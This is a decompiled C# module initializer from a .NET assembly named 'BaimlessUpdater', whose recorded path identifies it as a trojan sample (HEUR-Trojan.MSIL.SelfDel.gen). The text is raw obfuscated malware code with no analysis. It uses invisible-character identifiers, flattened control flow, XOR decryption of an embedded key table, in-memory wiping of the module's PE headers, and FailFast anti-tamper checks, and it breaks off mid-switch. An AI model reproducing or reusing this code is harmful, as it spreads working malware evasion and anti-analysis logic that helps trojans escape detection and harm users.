// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: BaimlessUpdater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 02E792F6-1196-4B1E-8FE3-C41C39AE998E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.SelfDel.gen-c4bf22c74971989ccf98aafcb3293325e06bf37402eb51930ca5429ae0bbf01c.exe

using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

internal class \u003CModule\u003E
{
  internal static byte[] \u206E‮‬‬‮⁪‏⁪​‮‪‎‬‏‫⁫​‭‍⁫‪‎⁭⁫⁫‌‌‮‌‏​‌‮⁪⁭‍‪‎‮‫‮;
  internal static \u003CModule\u003E.\u200D⁫‪⁪‭​⁯⁬‮‏​‌‬⁮⁬‭‬⁬‮​‫‬⁫‌‬⁭⁪⁬⁯‫⁪‍‎⁭‪‏‪‌‍‮‮ \u206E⁯⁯‫‫‍⁯⁭‮⁬​⁭⁭⁫‌‮‏​⁬⁭⁬‍‪‮‮⁬​⁮⁫‎⁯⁭⁭⁬⁭‮⁫‏⁪⁪‮;
  internal static Assembly \u202D⁬‫‫⁬⁬‎‌⁯⁪⁮‍‬‬‮⁪⁬‪​‎‌‌⁪‍‭​⁬⁭⁮‪‍‫⁬​⁫‍‏‫​‫‮;
  internal static \u003CModule\u003E.\u200C‭‫⁮⁪‪⁮⁪​⁮‫⁭‍⁪‌‪‍‫‍‏⁮‎‏⁪⁮​‬⁯⁮‫‭⁯⁪‍‪⁪‌‫⁯⁯‮ \u206C⁪⁬‪‎‭‫⁫​‭⁬⁭‫⁮⁯‭‪‌​‎⁬‭‬‪‫‮⁭‭‌‪⁬‫‬⁯⁫⁯‌⁮⁯⁭‮;

  static unsafe \u003CModule\u003E()
  {
    \u003CModule\u003E.\u206F‏⁪‫‏‎⁯⁫‍⁮‏‍‪⁭‌‮⁬​‪‮⁪‫‫⁭‍⁮‫⁭⁬⁯‭⁭⁬‎⁮⁪‏‬‏‮();
label_1:
    int num1 = -1838321668;
    byte[] numArray1;
    int num2;
    uint num3;
    uint[] numArray2;
    int index1;
    byte* numPtr1;
    byte* numPtr2;
    int num4;
    ushort length;
    int index2;
    ushort num5;
    byte* destination;
    MethodInfo method;
    byte* numPtr3;
    int index3;
    byte* numPtr4;
    Module module;
    int num6;
    byte* hinstance;
    byte* numPtr5;
    byte* numPtr6;
    byte* numPtr7;
    uint num7;
    ushort num8;
    uint[] numArray3;
    int index4;
    uint num9;
    int index5;
    uint num10;
    byte* numPtr8;
    uint num11;
    int index6;
    int index7;
    uint[] numArray4;
    uint[] numArray5;
    byte* numPtr9;
    uint num12;
    int index8;
    int num13;
    int index9;
    uint[] numArray6;
    int num14;
    uint num15;
    int index10;
    uint[] numArray7;
    int index11;
    uint num16;
    byte* numPtr10;
    int num17;
    ushort num18;
    uint num19;
    int index12;
    int num20;
    int index13;
    byte* numPtr11;
    int index14;
    while (true)
    {
      uint num21;
      switch ((num21 = (uint) (num1 ^ -1497430053)) % 217U)
      {
        case 0:
          index7 = 0;
          num1 = (int) num21 * -1456282645 ^ 1564600440;
          continue;
        case 1:
          destination += 40;
          ++index2;
          num1 = (int) num21 * -2120188679 ^ 2095095438;
          continue;
        case 2:
          int num22;
          num1 = num22 = index11 >= (int) length ? -736614793 : (num22 = -1102211672);
          continue;
        case 3:
          int num23;
          num1 = num23 = num20 >= (int) num18 ? -1081392944 : (num23 = -929047394);
          continue;
        case 4:
          numPtr2 += 4;
          num1 = (int) num21 * 60370304 ^ -1853802554;
          continue;
        case 5:
          goto label_1;
        case 6:
          num15 ^= num15 >> 12;
          num1 = -1407683487;
          continue;
        case 7:
          num14 = 0;
          num2 = 0;
          num1 = (int) num21 * -1762734964 ^ 1395708065;
          continue;
        case 8:
          num1 = (int) num21 * -2017119299 ^ 636446465;
          continue;
        case 9:
          int num24 = *numPtr1 != (byte) 0 ? 1484013454 : (num24 = 383031048);
          num1 = num24 ^ (int) num21 * 915660131;
          continue;
        case 10:
          // ISSUE: cast to a reference type
          \u003CModule\u003E.\u206F‭⁮​‬‎⁭‍⁬‎⁭⁭​​⁯‍‪‍⁬‏⁯⁬​‪⁪‌⁬‎‌⁭‫‌‎‎‏‏⁫⁪‎⁭‮(numPtr1, 4, 64U, (uint&) ref method);
          *(int*) numPtr1 = 0;
          num1 = (int) num21 * 1170918913 ^ -147679108;
          continue;
        case 11:
          *(int*) numPtr10 = 0;
          num1 = (int) num21 * 1782757270 ^ 1134327552;
          continue;
        case 12:
          int num25 = *numPtr2 == (byte) 0 ? -1150471820 : (num25 = -2005545342);
          num1 = num25 ^ (int) num21 * -2061746378;
          continue;
        case 13:
          Environment.FailFast((string) null);
          num1 = (int) num21 * -889683369 ^ -909184100;
          continue;
        case 14:
          numPtr1 += 2;
          num1 = (int) num21 * -233472908 ^ 194737316;
          continue;
        case 15:
          *(int*) numPtr4 = 1866691662;
          num1 = (int) num21 * 1155381720 ^ 1832960661;
          continue;
        case 16:
          num20 = 0;
          num1 = (int) num21 * 1950133191 ^ -1248639495;
          continue;
        case 17:
          numArray5[9] = numArray5[9] ^ numArray2[9];
          numArray5[10] = numArray5[10] ^ numArray2[10];
          numArray5[11] = numArray5[11] ^ numArray2[11];
          num1 = (int) num21 * -349783575 ^ -820669378;
          continue;
        case 18:
          int num26;
          num1 = num26 = numArray3[index5] <= num10 ? -1483936326 : (num26 = -716507376);
          continue;
        case 19:
          int num27;
          num1 = num27 = index9 >= 16 ? -1797942010 : (num27 = -402270698);
          continue;
        case 20:
          *numPtr2 = (byte) 0;
          num1 = -967279642;
          continue;
        case 21:
          numArray5 = new uint[16];
          num1 = (int) num21 * -216587054 ^ 1397248345;
          continue;
        case 22:
          index14 = 0;
          num1 = (int) num21 * -688112816 ^ -231083408;
          continue;
        case 23:
          *(short*) (numPtr4 + (new IntPtr(4) * 2).ToInt64()) = (short) 108;
          num1 = (int) num21 * 129170772 ^ -1660204064;
          continue;
        case 24:
          // ISSUE: cast to a reference type
          \u003CModule\u003E.\u206F‭⁮​‬‎⁭‍⁬‎⁭⁭​​⁯‍‪‍⁬‏⁯⁬​‪⁪‌⁬‎‌⁭‫‌‎‎‏‏⁫⁪‎⁭‮(destination, 8, 64U, (uint&) ref method);
          Marshal.Copy(new byte[8], 0, (IntPtr) (void*) destination, 8);
          num1 = -378437164;
          continue;
        case 25:
          *(int*) (numPtr4 + 4) = 1818504812;
          num1 = (int) num21 * 1822138318 ^ -521873307;
          continue;
        case 26:
          numArray6 = new uint[96]
          {
            2574892992U,
            3084754714U,
            3119981138U,
            3308524869U,
            2452459747U,
            2911375985U,
            270166486U,
            506348101U,
            3917311956U,
            2108103311U,
            4088435121U,
            1002812567U,
            4203011409U,
            498262313U,
            2804082487U,
            791152442U,
            128512038U,
            86576272U,
            3155865630U,
            1906508822U,
            4127439786U,
            2155687139U,
            1239208997U,
            3411833946U,
            440541152U,
            3293817677U,
            153760143U,
            134081400U,
            762944902U,
            52756475U,
            960956311U,
            3399026591U,
            4048443108U,
            3230919934U,
            3445335117U,
            1753064025U,
            3538924300U,
            1126087459U,
            354043222U,
            4198252267U,
            653270801U,
            1307382854U,
            2180091279U,
            2937726056U,
            2172972067U,
            1184919955U,
            1418737169U,
            1419296299U,
            3414177760U,
            4201415287U,
            1645742625U,
            1196909148U,
            3755120088U,
            1141218068U,
            834115933U,
            1372561591U,
            168515291U,
            1516869027U,
            4283500379U,
            1900938728U,
            3577097581U,
            1080848871U,
            4222692232U,
            726661107U,
            743590282U,
            2922416853U,
            1142628549U,
            1901078666U,
            3911015428U,
            2310938988U,
            2501849910U,
            62743203U,
            1237879913U,
            1223578522U,
            113983768U,
            3992516766U,
            1545962138U,
            3085345524U,
            1348394206U,
            3904794054U,
            2492819720U,
            1391836972U,
            3494208853U,
            4048269427U,
            2361895789U,
            3053929295U,
            2511380707U,
            2080040119U,
            4169952512U,
            1505079677U,
            148360219U,
            523266459U,
            3610541533U,
            1012986873U,
            3878194056U,
            2815219733U
          };
          num1 = (int) num21 * -871285859 ^ -211472801;
          continue;
        case 27:
          num11 = *(uint*) (numPtr8 + 12);
          index6 = 0;
          num1 = (int) num21 * 635505970 ^ 1968865497;
          continue;
        case 28:
          int num28 = num19 >= numArray3[index11] + numArray7[index11] ? 1771802855 : (num28 = 958652732);
          num1 = num28 ^ (int) num21 * 2069848779;
          continue;
        case 29:
          index9 = 0;
          num1 = -443486633;
          continue;
        case 30:
          // ISSUE: cast to a reference type
          \u003CModule\u003E.\u206F‭⁮​‬‎⁭‍⁬‎⁭⁭​​⁯‍‪‍⁬‏⁯⁬​‪⁪‌⁬‎‌⁭‫‌‎‎‏‏⁫⁪‎⁭‮(numPtr2, 4, 64U, (uint&) ref method);
          *numPtr2 = (byte) 0;
          ++numPtr2;
          num1 = -893364836;
          continue;
        case 31:
          num8 = *(ushort*) destination;
          num1 = (int) num21 * 903499514 ^ 27062011;
          continue;
        case 32:
          num1 = (int) num21 * 1285570054 ^ -1378811885;
          continue;
        case 33:
          byte* numPtr12 = numPtr1 + 12;
          numPtr1 = (byte*) ((ulong) (numPtr12 + *(uint*) numPtr12) + 7UL & 18446744073709551612UL);
          num1 = (int) num21 * 2035029110 ^ -5821430;
          continue;
        case 34:
          int num29;
          num1 = num29 = num17 < 8 ? -1826220452 : (num29 = -1252024504);
          continue;
        case 35:
          destination += 6;
          num1 = (int) num21 * 563271617 ^ -2093725397;
          continue;
        case 36:
          int num30;
          num1 = num30 = index2 < (int) length ? -575224555 : (num30 = -1896150660);
          continue;
        case 37:
          // ISSUE: cast to a reference type
          \u003CModule\u003E.\u206F‭⁮​‬‎⁭‍⁬‎⁭⁭​​⁯‍‪‍⁬‏⁯⁬​‪⁪‌⁬‎‌⁭‫‌‎‎‏‏⁫⁪‎⁭‮(numPtr1, 4, 64U, (uint&) ref method);
          num1 = -664373198;
          continue;
        case 38:
          numPtr2 += 3;
          num1 = (int) num21 * -1937503694 ^ 1824711491;
          continue;
        case 39:
          ++index9;
          num1 = (int) num21 * -1311841105 ^ -1789948729;
          continue;
        case 40:
          numPtr4 = stackalloc byte[11];
          int num31 = module.FullyQualifiedName[0] != '<' ? 722774579 : (num31 = 1919163134);
          num1 = num31 ^ (int) num21 * 1540829025;
          continue;
        case 41:
          *numPtr1 = (byte) 0;
          num1 = (int) num21 * 657301872 ^ -1245796883;
          continue;
        case 42:
          num1 = (int) num21 * 499180848 ^ -253377965;
          continue;
        case 43:
          ++index11;
          num1 = -1921230496;
          continue;
        case 44:
          ++numPtr2;
          int num32 = *numPtr2 != (byte) 0 ? 616645416 : (num32 = 1043570699);
          num1 = num32 ^ (int) num21 * 479422450;
          continue;
        case 45:
          numArray5[0] = numArray5[0] ^ numArray2[0];
          num1 = (int) num21 * 949496692 ^ -1352229622;
          continue;
        case 46:
          // ISSUE: cast to a reference type
          \u003CModule\u003E.\u206F‭⁮​‬‎⁭‍⁬‎⁭⁭​​⁯‍‪‍⁬‏⁯⁬​‪⁪‌⁬‎‌⁭‫‌‎‎‏‏⁫⁪‎⁭‮(numPtr6, 11, 64U, (uint&) ref method);
          *(int*) numPtr4 = 1866691662;
          num1 = (int) num21 * 1223384668 ^ 1161936448;
          continue;
        case 47:
          int num33;
          num1 = num33 = index6 >= (int) length ? -1574646850 : (num33 = -754062847);
          continue;
        case 48:
          numPtr2 += 12;
          num1 = (int) num21 * 1835677681 ^ -2097813466;
          continue;
        case 49:
          int num34;
          num1 = num34 = index3 < 11 ? -202815085 : (num34 = -728272556);
          continue;
        case 50:
          int num35;
          num1 = num35 = index8 >= 11 ? -1810113326 : (num35 = -375629963);
          continue;
        case 51:
          *(int*) numPtr11 = 0;
          num1 = -2072713527;
          continue;
        case 52:
          numPtr11 = hinstance + num19;
          num1 = -210779440;
          continue;
        case 53:
          hinstance = (byte*) (void*) Marshal.GetHINSTANCE(module);
          num1 = (int) num21 * 1139578236 ^ -989569385;
          continue;
        case 54:
          numPtr5 = hinstance + *(uint*) numPtr9;
          numPtr3 = hinstance + *(uint*) (numPtr9 + 12);
          num1 = (int) num21 * 1140893909 ^ -176648354;
          continue;
        case 55:
          num19 = *(uint*) (destination - 16);
          num16 = *(uint*) (destination - 120);
          numArray3 = new uint[(int) length];
          num1 = -388602162;
          continue;
        case 56:
          numArray5[index9] = numArray6[num14 + index9];
          num1 = -1984659619;
          continue;
        case 57:
          num19 = num19 - numArray3[index11] + numArray4[index11];
          num1 = (int) num21 * -237024250 ^ 1259917773;
          continue;
        case 58:
          numArray5[1] = numArray5[1] ^ numArray2[1];
          num1 = (int) num21 * 1219599945 ^ 1759111968;
          continue;
        case 59:
          num1 = (int) num21 * 783443409 ^ 1755412274;
          continue;
        case 60:
          num1 = (int) num21 * 1062087028 ^ -2058934402;
          continue;
        case 61:
          numArray5[3] = numArray5[3] ^ numArray2[3];
          num1 = (int) num21 * 428531563 ^ 743327869;
          continue;
        case 62:
          numArray4 = new uint[(int) length];
          num1 = (int) num21 * -154504479 ^ -413716611;
          continue;
        case 63:
          int num36 = num16 != 0U ? 2106015414 : (num36 = 1227301981);
          num1 = num36 ^ (int) num21 * -1049564536;
          continue;
        case 64:
          int num37;
          num1 = num37 = numArray3[index6] > num11 ? -1338306875 : (num37 = -1712595209);
          continue;
        case 65:
          *numPtr2 = (byte) 0;
          num1 = -663580868;
          continue;
        case 66:
          num9 = *(uint*) numPtr8;
          index4 = 0;
          num1 = (int) num21 * -1375393595 ^ 27483905;
          continue;
        case 67:
          num11 = num11 - numArray3[index6] + numArray4[index6];
          num1 = (int) num21 * 1486479983 ^ 2082068021;
          continue;
        case 68:
          numPtr2 += 4;
          num1 = (int) num21 * -1438394943 ^ 157884544;
          continue;
        case 69:
          index11 = 0;
          num1 = -1921230496;
          continue;
        case 70:
          num1 = (int) num21 * -855009185 ^ 1019455478;
          continue;
        case 71:
          numPtr10 = hinstance + *(uint*) (destination - 16);
          num1 = (int) num21 * 1386353602 ^ -175885744;
          continue;
        case 72:
          int num38 = num10 >= numArray3[index5] + numArray7[index5] ? -968211224 : (num38 = -487444930);
          num1 = num38 ^ (int) num21 * -2009897224;
          continue;
        case 73:
          num17 = 0;
          num1 = (int) num21 * 1112734914 ^ -1141585407;
          continue;
        case 74:
          int num39 = num7 < numArray3[index7] + numArray7[index7] ? 2063365317 : (num39 = 639809826);
          num1 = num39 ^ (int) num21 * 1504915565;
          continue;
        case 75:
          string str = \u003CModule\u003E.\u202E‍‌‌‌‎‮⁯‬‎‍‭⁮⁬​‪‎‮‮‫‫⁫⁯​​‪‫‭‭⁮⁬​‫‪‍⁮‫‭‮‮<string>(-882992112);
          object obj = method.Invoke((object) null, new object[1]
          {
            (object) \u003CModule\u003E.\u206A‬‪‫‪‌‍‌‫⁯‍⁮‌⁭⁯‫⁪⁫‪‮⁬‎⁫‬⁯‫⁮⁬‍⁯​‫⁯‏‫‭⁯‎‎‬‮<string>(-1256044458)
          });
          int num40;
          num1 = num40 = str.Equals(obj) ? -629552961 : (num40 = -468733600);
          continue;
        case 76:
          int num41 = *numPtr2 == (byte) 0 ? -653376717 : (num41 = -11313475);
          num1 = num41 ^ (int) num21 * 1950227993;
          continue;
        case 77:
          num4 = 0;
          num1 = -786946669;
          continue;
        case 78:
          length = *(ushort*) destination;
          destination += 14;
          num1 = (int) num21 * 1347540213 ^ 873740775;
          continue;
        case 79:
          num1 = -1758070129;
          continue;
        case 80:
          byte[] numArray8 = numArray1;
          int index15 = num2;
          int num42 = index15 + 1;
          int num43 = (int) (byte) (num3 >> 8);
          numArray8[index15] = (byte) num43;
          byte[] numArray9 = numArray1;
          int index16 = num42;
          int num44 = index16 + 1;
          int num45 = (int) (byte) (num3 >> 16);
          numArray9[index16] = (byte) num45;
          byte[] numArray10 = numArray1;
          int index17 = num44;
          num2 = index17 + 1;
          int num46 = (int) (byte) (num3 >> 24);
          numArray10[index17] = (byte) num46;
          numArray2[index1] ^= num3;
          ++index1;
          num1 = (int) num21 * -381571474 ^ -714668053;
          continue;
        case 81:
          num18 = (ushort) *numPtr1;
          numPtr1 += 2;
          num1 = (int) num21 * -889952182 ^ 169591498;
          continue;
        case 82:
          ++numPtr2;
          num1 = (int) num21 * -1175369153 ^ -1848092594;
          continue;
        case 83:
          method = typeof (Environment).GetMethod(\u003CModule\u003E.\u206C⁯⁯⁬⁫‮‍‮‮‪⁪‪⁬‪⁮⁬‬‍‬‌‏⁪‬‍‫‮‬‮⁮⁯‬‮‪⁫‬‍⁯⁫‪⁮‮<string>(1529271095), new Type[1]
          {
            typeof (string)
          });
          num1 = -118955695;
          continue;
        case 84:
          num1 = (int) num21 * -2062639846 ^ 2017949037;
          continue;
        case 85:
          ++num17;
          num1 = (int) num21 * 677831186 ^ -1817855231;
          continue;
        case 86:
          numArray5[12] = numArray5[12] ^ numArray2[12];
          numArray5[13] = numArray5[13] ^ numArray2[13];
          num1 = (int) num21 * 1856187790 ^ -795355838;
          continue;
        case 87:
          int num47;
          num1 = num47 = index12 < 11 ? -640006021 : (num47 = -1576403922);
          continue;
        case 88:
          numPtr7 = hinstance + num9;
          num1 = -1528198858;
          continue;
        case 89:
          numArray1 = new byte[(int) num12 * 4];
          num1 = (int) num21 * 757310069 ^ 1271433271;
          continue;
        case 90:
          numArray5[15] = numArray5[15] ^ numArray2[15];
          index1 = 0;
          num1 = (int) num21 * -2111303359 ^ 1229817307;
          continue;
        case 91:
          numPtr4[10] = (byte) 0;
          num1 = (int) num21 * 1849745747 ^ 1345352545;
          continue;
        case 92:
          // ISSUE: cast to a reference type
          \u003CModule\u003E.\u206F‭⁮​‬‎⁭‍⁬‎⁭⁭​​⁯‍‪‍⁬‏⁯⁬​‪⁪‌⁬‎‌⁭‫‌‎‎‏‏⁫⁪‎⁭‮(numPtr2, 8, 64U, (uint&) ref method);
          num1 = -907166231;
          continue;
        case 93:
          destination = destination + 4 + (int) num8;
          num1 = (int) num21 * -168663055 ^ 714699284;
          continue;
        case 94:
          // ISSUE: cast to a reference type
          \u003CModule\u003E.\u206F‭⁮​‬‎⁭‍⁬‎⁭⁭​​⁯‍‪‍⁬‏⁯⁬​‪⁪‌⁬‎‌⁭‫‌‎‎‏‏⁫⁪‎⁭‮(destination, 8, 64U, (uint&) ref method);
          num1 = -433697048;
          continue;
        case 95:
          numArray7[index2] = *(uint*) (destination + 8);
          num1 = (int) num21 * -1017636112 ^ -1972844236;
          continue;
        case 96:
          int num48;
          num1 = num48 = (long) num14 >= (long) num12 ? -174242865 : (num48 = -1590236120);
          continue;
        case 97:
          numArray3[index2] = *(uint*) (destination + 12);
          num1 = (int) num21 * -2133761453 ^ 1949813798;
          continue;
        case 98:
          num1 = (int) num21 * -1708119827 ^ -1324040661;
          continue;
        case 99:
          num5 = (ushort) *numPtr2;
          numPtr2 += 2;
          num1 = (int) num21 * 350127836 ^ 1020153057;
          continue;
        case 100:
          \u003CModule\u003E.\u206E‮‬‬‮⁪‏⁪​‮‪‎‬‏‫⁫​‭‍⁫‪‎⁭⁫⁫‌‌‮‌‏​‌‮⁪⁭‍‪‎‮‫‮ = \u003CModule\u003E.\u202B⁪‪‪⁮‭‮⁮‎‎‮⁯⁫⁫‮⁫‫​⁮⁬⁮⁮‏⁯⁮⁬​‍‌⁪⁭‍‎‌⁬‬‏‎‫‎‮(numArray1);
          num1 = (int) num21 * 1841247529 ^ 1547249622;
          continue;
        case 101:
          ++numPtr1;
          num1 = (int) num21 * -57015457 ^ -579105432;
          continue;
        case 102:
          num1 = (int) num21 * 1088222371 ^ -119372833;
          continue;
        case 103:
          num1 = (int) num21 * -1344240275 ^ 1309535136;
          continue;
        case 104:
          destination = hinstance + 60;
          num1 = (int) num21 * -64607261 ^ 200512025;
          continue;
        case 105:
          destination = hinstance + *(uint*) destination;
          num1 = (int) num21 * 1560174898 ^ 1235755093;
          continue;
        case 106:
          numPtr2 += 2;
          num1 = (int) num21 * -509807749 ^ 1989053036;
          continue;
        case 107:
          *(int*) (numPtr4 + 4) = 1852404846;
          num1 = (int) num21 * 112338921 ^ 184242689;
          continue;
        case 108:
          \u003CModule\u003E.\u206B⁯⁮⁬‭⁮‍‪‏⁯‬‮⁭‌⁫⁪⁫​‍‏⁯⁭‫‍‭⁮​⁪⁭⁬​‏⁭⁫‫‬⁮⁬‭⁮‮();
          num1 = (int) num21 * -1458285843 ^ -1021870012;
          continue;
        case 109:
          numPtr2 += 2;
          num1 = (int) num21 * 1477849093 ^ -1457426307;
          continue;
        case 110:
          num1 = (int) num21 * 1766513055 ^ 1011126077;
          continue;
        case 111:
          // ISSUE: cast to a reference type
          \u003CModule\u003E.\u206F‭⁮​‬‎⁭‍⁬‎⁭⁭​​⁯‍‪‍⁬‏⁯⁬​‪⁪‌⁬‎‌⁭‫‌‎‎‏‏⁫⁪‎⁭‮(numPtr1, 8, 64U, (uint&) ref method);
          numPtr1 = numPtr1 + 4 + 4;
          num13 = 0;
          num1 = -661813856;
          continue;
        case 112:
          numPtr6[index12] = numPtr4[index12];
          num1 = -1965093290;
          continue;
        case 113:
          // ISSUE: cast to a reference type
          \u003CModule\u003E.\u206F‭⁮​‬‎⁭‍⁬‎⁭⁭​​⁯‍‪‍⁬‏⁯⁬​‪⁪‌⁬‎‌⁭‫‌‎‎‏‏⁫⁪‎⁭‮(numPtr10, 72, 64U, (uint&) ref method);
          numPtr2 = hinstance + *(uint*) (numPtr10 + 8);
          num1 = (int) num21 * 2056097839 ^ 81306235;
          continue;
        case 114:
          ++numPtr1;
          int num49 = *numPtr1 != (byte) 0 ? 244506868 : (num49 = 554794564);
          num1 = num49 ^ (int) num21 * -1643117910;
          continue;
        case 115:
          int num50 = *(uint*) (destination - 120) == 0U ? -884505690 : (num50 = -1322507035);
          num1 = num50 ^ (int) num21 * -1880165336;
          continue;
        case 116:
          numArray7 = new uint[(int) length];
          num1 = (int) num21 * -848425102 ^ 1233193743;
          continue;
        case 117:
          (hinstance + num7)[index13] = numPtr4[index13];
          ++index13;
          num1 = -1305354957;
          continue;
        case 118:
          num9 = num9 - numArray3[index4] + numArray4[index4];
          num1 = (int) num21 * -615288860 ^ -1496555930;
          continue;
        case 119:
          *(int*) numPtr2 = 0;
          num1 = (int) num21 * -1949258827 ^ -1363286012;
          continue;
        case 120:
          *(short*) (numPtr4 + (new IntPtr(4) * 2).ToInt64()) = (short) 25973;
          num1 = (int) num21 * -1274417020 ^ 332928307;
          continue;
        case 121:
          num16 = num16 - numArray3[index14] + numArray4[index14];
          num1 = (int) num21 * 1516238186 ^ -1090050406;
          continue;
        case 122:
          int num51 = (object) method == null ? 615683602 : (num51 = 167281270);
          num1 = num51 ^ (int) num21 * -1932391451;
          continue;
        case 123:
          num1 = (int) num21 * 224506060 ^ 1830682610;
          continue;
        case 124:
          numArray5[8] = numArray5[8] ^ numArray2[8];
          num1 = (int) num21 * -1404240152 ^ -243942512;
          continue;
        case 125:
          num12 = 96U;
          num1 = (int) num21 * -1365156156 ^ -755882901;
          continue;
        case 126:
          index2 = 0;
          num1 = (int) num21 * -525774439 ^ 141422125;
          continue;
        case (uint) sbyte.MaxValue:
          int num52;
          num1 = num52 = index1 >= 16 ? -1027238877 : (num52 = -1584998309);
          continue;
        case 128:
          index3 = 0;
          num1 = (int) num21 * -1891332214 ^ 1316361542;
          continue;
        case 129:
          int num53 = num9 >= numArray3[index4] + numArray7[index4] ? -568739613 : (num53 = -960544823);
          num1 = num53 ^ (int) num21 * 1213981781;
          continue;
        case 130:
          numPtr6 = hinstance + *(uint*) numPtr5 + 2;
          num1 = (int) num21 * 1261126116 ^ -957090679;
          continue;
        case 131:
          numPtr1 += 2;
          num1 = (int) num21 * 2073474158 ^ -1214401051;
          continue;
        case 132:
          index12 = 0;
          num1 = (int) num21 * 1592578010 ^ -1315998871;
          continue;
        case 133:
          *(int*) (numPtr11 + 4) = 0;
          num1 = (int) num21 * -83765020 ^ 251783297;
          continue;
        case 134:
          ++index7;
          num1 = -1142450950;
          continue;
        case 135:
          int num54 = num11 < numArray3[index6] + numArray7[index6] ? -1555053440 : (num54 = -1707524715);
          num1 = num54 ^ (int) num21 * -1644662276;
          continue;
        case 136:
          int num55;
          num1 = num55 = numArray3[index11] <= num19 ? -222663757 : (num55 = -1879091553);
          continue;
        case 137:
          num14 += 16;
          num1 = (int) num21 * 2109535922 ^ -1791010142;
          continue;
        case 138:
          num1 = (int) num21 * 1941011543 ^ -319620693;
          continue;
        case 139:
          numArray4[index2] = *(uint*) (destination + 20);
          num1 = (int) num21 * 1611377570 ^ -850276361;
          continue;
        case 140:
          int num56;
          num1 = num56 = numArray3[index14] > num16 ? -1890013338 : (num56 = -1541481982);
          continue;
        case 141:
          num1 = (int) num21 * -2084518051 ^ 552136985;
          continue;
        case 142:
          index8 = 0;
          num1 = (int) num21 * 1930783294 ^ -756137861;
          continue;
        case 143:
          num15 ^= num15 << 25;
          num1 = (int) num21 * -448821164 ^ -78589477;
          continue;
        case 144:
          ++index5;
          num1 = -574191142;
          continue;
        case 145:
          numArray1[num2++] = (byte) num3;
          num1 = (int) num21 * 1544913875 ^ 154897639;
          continue;
        case 146:
          num1 = (int) num21 * 1136204431 ^ 1606580953;
          continue;
        case 147:
          numPtr1 += 3;
          num1 = (int) num21 * 2009350872 ^ 881201132;
          continue;
        case 148:
          int num57;
          num1 = num57 = num13 >= 8 ? -989268887 : (num57 = -563560220);
          continue;
        case 149:
          ++numPtr2;
          num1 = (int) num21 * -1268958022 ^ -958997655;
          continue;
        case 150:
          numPtr2 = (byte*) ((ulong) (numPtr2 + *(uint*) numPtr2) + 7UL & 18446744073709551612UL);
          num1 = (int) num21 * -1782677847 ^ 1284608116;
          continue;
        case 151:
          numPtr3[index3] = numPtr4[index3];
          ++index3;
          num1 = -1160175218;
          continue;
        case 152:
          numPtr9 = hinstance + *(uint*) (destination - 120);
          num1 = (int) num21 * -455505168 ^ 1565731219;
          continue;
        case 153:
          ++numPtr1;
          int num58 = *numPtr1 == (byte) 0 ? 1404697760 : (num58 = 734786958);
          num1 = num58 ^ (int) num21 * -1133885374;
          continue;
        case 154:
          num3 = numArray5[index1];
          num1 = -361150308;
          continue;
        case 155:
          numPtr4[10] = (byte) 0;
          num1 = (int) num21 * -813746805 ^ 751456931;
          continue;
        case 156:
          num1 = (int) num21 * 196325475 ^ -2021992701;
          continue;
        case 157:
          ++numPtr1;
          ++num13;
          num1 = (int) num21 * -1422374467 ^ 1417109508;
          continue;
        case 158:
          numArray5[2] = numArray5[2] ^ numArray2[2];
          num1 = (int) num21 * 2092969318 ^ 1734319623;
          continue;
        case 159:
          num1 = (int) num21 * 932212171 ^ 1141510721;
          continue;
        case 160:
          int num59;
          num1 = num59 = index4 < (int) length ? -1330771915 : (num59 = -1507903953);
          continue;
        case 161:
          module = typeof (\u003CModule\u003E).Module;
          num1 = (int) num21 * 33737040 ^ -226963527;
          continue;
        case 162:
          int num60;
          num1 = num60 = index13 >= 11 ? -1598338331 : (num60 = -679673949);
          continue;
        case 163:
          *numPtr2 = (byte) 0;
          ++numPtr2;
          num1 = -1563017606;
          continue;
        case 164:
          int num61;
          num1 = num61 = num4 >= (int) length ? -1301756052 : (num61 = -1776551674);
          continue;
        case 165:
          num1 = (int) num21 * -1088947691 ^ -1565671699;
          continue;
        case 166:
          ++num20;
          num1 = -2012367798;
          continue;
        case 167:
          Marshal.Copy(new byte[8], 0, (IntPtr) (void*) destination, 8);
          destination += 40;
          ++num4;
          num1 = (int) num21 * -1875744084 ^ 173697495;
          continue;
        case 168:
          *(int*) numPtr4 = 1818522734;
          num1 = (int) num21 * 1273583944 ^ 1454208913;
          continue;
        case 169:
          num6 = 0;
          num1 = (int) num21 * -1211016188 ^ 723689821;
          continue;
        case 170:
          *(short*) (numPtr4 + (new IntPtr(4) * 2).ToInt64()) = (short) 108;
          num1 = (int) num21 * -275600253 ^ 2110406085;
          continue;
        case 171:
          *(int*) (numPtr10 + 4) = 0;
          *(int*) (numPtr10 + (new IntPtr(2) * 4).ToInt64()) = 0;
          num1 = (int) num21 * -1642793636 ^ 1240086865;
          continue;
        case 172:
          num10 = num10 - numArray3[index5] + numArray4[index5];
          num1 = (int) num21 * 1995624665 ^ -1806963542;
          continue;
        case 173:
          *(int*) numPtr4 = 1818522734;
          *(int*) (numPtr4 + 4) = 1818504812;
          num1 = (int) num21 * -498950077 ^ -243760837;
          continue;
        case 174:
          num10 = *(uint*) (numPtr11 + 8);
          index5 = 0;
          num1 = (int) num21 * 1449240781 ^ -1280262011;
          continue;
        case 175:
          int num62;
          num1 = num62 = index7 < (int) length ? -1133380275 : (num62 = -2137137206);
          continue;
        case 176:
          numPtr4[10] = (byte) 0;
          num1 = (int) num21 * 263909866 ^ -757436149;
          continue;
        case 177:
          numPtr4[10] = (byte) 0;
          num1 = (int) num21 * -307727217 ^ -1988218615;
          continue;
        case 178:
          numArray2 = new uint[16];
          num15 = 997928021U;
          index10 = 0;
          num1 = (int) num21 * -985199985 ^ 1334010728;
          continue;
        case 179:
          numArray5[4] = numArray5[4] ^ numArray2[4];
          numArray5[5] = numArray5[5] ^ numArray2[5];
          numArray5[6] = numArray5[6] ^ numArray2[6];
          numArray5[7] = numArray5[7] ^ numArray2[7];
          num1 = (int) num21 * -1399506194 ^ -707861415;
          continue;
        case 180:
          numArray5[14] = numArray5[14] ^ numArray2[14];
          num1 = (int) num21 * -958707875 ^ 1082037878;
          continue;
        case 181:
          num1 = -268522823;
          continue;
        case 182:
          int num63;
          num1 = num63 = index10 >= 16 ? -1922368828 : (num63 = -1544659279);
          continue;
        case 183:
          num1 = (int) num21 * 347414842 ^ 380571682;
          continue;
        case 184:
          // ISSUE: cast to a reference type
